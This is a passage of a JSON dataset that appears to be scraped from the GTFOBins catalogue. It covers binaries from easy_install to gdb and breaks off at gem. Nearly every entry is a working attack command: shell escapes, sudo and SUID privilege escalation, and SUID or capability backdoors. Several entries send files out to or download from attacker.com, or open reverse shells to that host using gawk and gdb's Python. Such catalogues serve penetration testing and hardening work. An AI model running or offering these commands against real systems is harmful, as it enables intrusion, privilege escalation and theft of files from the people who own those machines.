        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request. The file path must be absolute.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', '$(whereis python)', '-c', \\\"\\\"\\\"import sys;\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve('$URL', '$LFILE')\\\"\\\"\\\")\" > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe file path must be absolute.\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is wrapped within program messages.\nTF=$(mktemp -d)\necho 'print(open(\"file_to_read\").read())' > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nTF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\neasy_install $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF"
      }
    ]
  },
  {
    "id": 84,
    "bin": "eb",
    "url": "/gtfobins/eb/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\neb logs\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo eb logs\n!/bin/sh"
      }
    ]
  },
  {
    "id": 85,
    "bin": "ed",
    "url": "/gtfobins/ed/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ned\n!/bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\ned file_to_write\na\nDATA\n.\nw\nq\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\ned file_to_read\n,p\nq\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ed) .\n\n./ed file_to_read\n,p\nq\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ed\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ed) .\n\n./ed\n!/bin/sh"
      }
    ]
  },
  {
    "id": 86,
    "bin": "efax",
    "url": "/gtfobins/efax/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which efax) .\n\nLFILE=file_to_read\n./efax -d \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo efax -d \"$LFILE\""
      }
    ]
  },
  {
    "id": 87,
    "bin": "emacs",
    "url": "/gtfobins/emacs/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nemacs -Q -nw --eval '(term \"/bin/sh\")'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nemacs file_to_write\nDATA\nC-x C-s\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nemacs file_to_read\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which emacs) .\n\n./emacs -Q -nw --eval '(term \"/bin/sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
      }
    ]
  },
  {
    "id": 88,
    "bin": "env",
    "url": "/gtfobins/env/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nenv /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which env) .\n\n./env /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo env /bin/sh"
      }
    ]
  },
  {
    "id": 89,
    "bin": "eqn",
    "url": "/gtfobins/eqn/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\neqn \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which eqn) .\n\nLFILE=file_to_read\n./eqn \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo eqn \"$LFILE\""
      }
    ]
  },
  {
    "id": 90,
    "bin": "ex",
    "url": "/gtfobins/ex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nex\n!/bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nex file_to_write\na\nDATA\n.\nw\nq\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nex file_to_read\n,p\nq\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ex\n!/bin/sh"
      }
    ]
  },
  {
    "id": 91,
    "bin": "exiftool",
    "url": "/gtfobins/exiftool/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT"
      }
    ]
  },
  {
    "id": 92,
    "bin": "expand",
    "url": "/gtfobins/expand/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nexpand \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which expand) .\n\nLFILE=file_to_read\n./expand \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo expand \"$LFILE\""
      }
    ]
  },
  {
    "id": 93,
    "bin": "expect",
    "url": "/gtfobins/expect/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nexpect -c 'spawn /bin/sh;interact'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is read and parsed as an expect command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.\nLFILE=file_to_read\nexpect $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which expect) .\n\n./expect -c 'spawn /bin/sh -p;interact'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo expect -c 'spawn /bin/sh;interact'"
      }
    ]
  },
  {
    "id": 94,
    "bin": "facter",
    "url": "/gtfobins/facter/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"
      }
    ]
  },
  {
    "id": 95,
    "bin": "file",
    "url": "/gtfobins/file/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nEach input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.\nLFILE=file_to_read\nfile -f $LFILE\n\n\nEach line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\nIf a line in the target file begins with a #, it will not be printed as these lines are parsed as comments.\nIt can also be provided with a directory and will read each file in the directory.\nLFILE=file_to_read\nfile -m $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nEach input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.\nsudo install -m =xs $(which file) .\n\nLFILE=file_to_read\n./file -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nEach input line is treated as a filename for the file command and the output is corrupted by a suffix : followed by the result or the error of the operation, so this may not be suitable for binary files.\nLFILE=file_to_read\nsudo file -f $LFILE"
      }
    ]
  },
  {
    "id": 96,
    "bin": "find",
    "url": "/gtfobins/find/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nfind . -exec /bin/sh \\; -quit\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which find) .\n\n./find . -exec /bin/sh -p \\; -quit\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo find . -exec /bin/sh \\; -quit"
      }
    ]
  },
  {
    "id": 97,
    "bin": "finger",
    "url": "/gtfobins/finger/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a binary file to a TCP port. Run sudo nc -l -p 79 | base64 -d > \"file_to_save\" on the attacker box to collect the file. The file length is limited by the maximum size of arguments.\nRHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\"\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch remote binary file from a remote TCP port. Run base64 \"file_to_send\" | sudo nc -l -p 79 on the attacker box to send the file.\nRHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""
      }
    ]
  },
  {
    "id": 98,
    "bin": "fish",
    "url": "/gtfobins/fish/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nfish\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which fish) .\n\n./fish\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo fish"
      }
    ]
  },
  {
    "id": 99,
    "bin": "flock",
    "url": "/gtfobins/flock/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nflock -u / /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which flock) .\n\n./flock -u / /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo flock -u / /bin/sh"
      }
    ]
  },
  {
    "id": 100,
    "bin": "fmt",
    "url": "/gtfobins/fmt/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis only works for the GNU version of fmt.\nLFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n\n\nThis corrupts the output by wrapping very long lines at the given width.\nLFILE=file_to_read\nfmt -999 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis corrupts the output by wrapping very long lines at the given width.\nsudo install -m =xs $(which fmt) .\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis corrupts the output by wrapping very long lines at the given width.\nLFILE=file_to_read\nsudo fmt -999 \"$LFILE\""
      }
    ]
  },
  {
    "id": 101,
    "bin": "fold",
    "url": "/gtfobins/fold/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which fold) .\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\""
      }
    ]
  },
  {
    "id": 102,
    "bin": "fping",
    "url": "/gtfobins/fping/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nfping -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo fping -f $LFILE"
      }
    ]
  },
  {
    "id": 103,
    "bin": "ftp",
    "url": "/gtfobins/ftp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nftp\n!/bin/sh\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file to a FTP server.\nRHOST=attacker.com\nftp $RHOST\nput file_to_send\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file from a FTP server.\nRHOST=attacker.com\nftp $RHOST\nget file_to_get\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ftp\n!/bin/sh"
      }
    ]
  },
  {
    "id": 104,
    "bin": "gawk",
    "url": "/gtfobins/gawk/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nRHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell.\nLPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ngawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gawk) .\n\nLFILE=file_to_read\n./gawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo gawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gawk) .\n\n./gawk 'BEGIN {system(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 105,
    "bin": "gcc",
    "url": "/gtfobins/gcc/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngcc -wrapper /bin/sh,-s .\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo gcc -wrapper /bin/sh,-s ."
      }
    ]
  },
  {
    "id": 106,
    "bin": "gcore",
    "url": "/gtfobins/gcore/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\ngcore $PID\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gcore) .\n\n./gcore $PID\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo gcore $PID"
      }
    ]
  },
  {
    "id": 107,
    "bin": "gdb",
    "url": "/gtfobins/gdb/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngdb -nx -ex '!sh' -ex quit\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that GDB is compiled with Python support. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that GDB is compiled with Python support. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit\n\n\nThis requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThis requires that GDB is compiled with Python support.\nLFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis requires that GDB is compiled with Python support.\ngdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that GDB is compiled with Python support.\ngdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that GDB is compiled with Python support.\nsudo install -m =xs $(which gdb) .\n\n./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo gdb -nx -ex '!sh' -ex quit\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that GDB is compiled with Python support.\ncp $(which gdb) .\nsudo setcap cap_setuid+ep gdb\n\n./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
      }
    ]
  },
  {
    "id": 108,
    "bin": "gem",
    "url": "/gtfobins/gem/",
    "funcs": [
      {
        "func": "Shell",
